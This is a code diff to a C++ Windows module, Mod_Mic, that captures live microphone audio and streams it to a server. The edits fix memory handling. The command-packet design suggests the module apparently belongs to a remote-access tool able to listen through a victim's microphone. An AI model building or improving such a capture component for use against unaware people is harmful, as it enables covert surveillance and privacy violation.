@@ -2,7 +2,7 @@
 #include "misc.hpp"
 
 constexpr int NUM_BUFFERS = 2;
-constexpr int SAMPLE_RATE = 11025; // 7.0khz
+constexpr int SAMPLE_RATE = 11025; // 11.02khz
 constexpr int NUM_CHANNELS = 2;
 constexpr int BITS_PER_SAMPLE = 16;
 
@@ -77,10 +77,10 @@ void Mod_Mic::m_LiveMicTh() {
     wfx.nChannels = NUM_CHANNELS;
     wfx.nSamplesPerSec = SAMPLE_RATE;
     wfx.wBitsPerSample = BITS_PER_SAMPLE;
-    //wfx.nBlockAlign = wfx.wBitsPerSample * wfx.nChannels / 8;
     wfx.nBlockAlign = (wfx.wBitsPerSample / 8) * wfx.nChannels;
     wfx.nAvgBytesPerSec = wfx.nBlockAlign * wfx.nSamplesPerSec;
 
+    //BUFFER_SIZE = SAMPLE_RATE * NUM_CHANNELS * BITS_PER_SAMPLE
     // Abrir el dispositivo de grabación
     
     HWAVEIN wi;
@@ -109,6 +109,10 @@ void Mod_Mic::m_LiveMicTh() {
     if(waveInPrepareHeader(wi, &headers, sizeof(headers)) != MMSYSERR_NOERROR) {
         DebugPrint("No se pudo preparar el header");
         waveInClose(wi);
+        if (buffers) {
+            delete[] buffers;
+            buffers = nullptr;
+        }
         return;
     }
 
@@ -116,6 +120,10 @@ void Mod_Mic::m_LiveMicTh() {
         DebugPrint("No se pudo agregar datos al buffer");
         waveInUnprepareHeader(wi, &headers, sizeof(headers));
         waveInClose(wi);
+        if (buffers) {
+            delete[] buffers;
+            buffers = nullptr;
+        }
         return;
     }
 
@@ -124,6 +132,10 @@ void Mod_Mic::m_LiveMicTh() {
         DebugPrint("Error iniciando la grabacion");
         waveInUnprepareHeader(wi, &headers, sizeof(headers));
         waveInClose(wi);
+        if (buffers) {
+            delete[] buffers;
+            buffers = nullptr;
+        }
         return;
     }
 
@@ -132,30 +144,23 @@ void Mod_Mic::m_LiveMicTh() {
     std::string strHeader = std::to_string(EnumComandos::Mic_Live_Packet);
     strHeader.append(1, CMD_DEL);
     int iHeaderSize = strHeader.size();
-    int iBuffsize = BUFFER_SIZE + iHeaderSize + 1;
-    char* newBuffer = new char[iBuffsize];
-    std::memcpy(newBuffer, strHeader.c_str(), iHeaderSize);
+    int iBuffsize = BUFFER_SIZE + iHeaderSize;
+    
+    std::vector<char> newBuffer(iBuffsize);
+    std::memcpy(newBuffer.data(), strHeader.c_str(), iHeaderSize);
 
     while (this->isLiveMic) {
         if (headers.dwFlags & WHDR_DONE) {
             // Enviar datos de audio al servidor
-            newBuffer[iHeaderSize + headers.dwBufferLength] = '\0';
-
-            std::memcpy(newBuffer + iHeaderSize, headers.lpData, headers.dwBufferLength);
+            std::memcpy(newBuffer.data() + iHeaderSize, headers.lpData, headers.dwBufferLength);
                 
-            cCliente->cSend(this->sckSocket, newBuffer, iBuffsize, 0, true, nullptr);
-
+            cCliente->cSend(this->sckSocket, newBuffer.data(), iBuffsize, 0, true, nullptr);
+            
             if (waveInAddBuffer(wi, &headers, sizeof(headers)) != MMSYSERR_NOERROR) {
                 break;
             }
         }
     }
-
-    if (newBuffer) {
-        delete[] newBuffer;
-        newBuffer = nullptr;
-    }
-
 
     // Detener y limpiar la grabación
     waveInStop(wi);
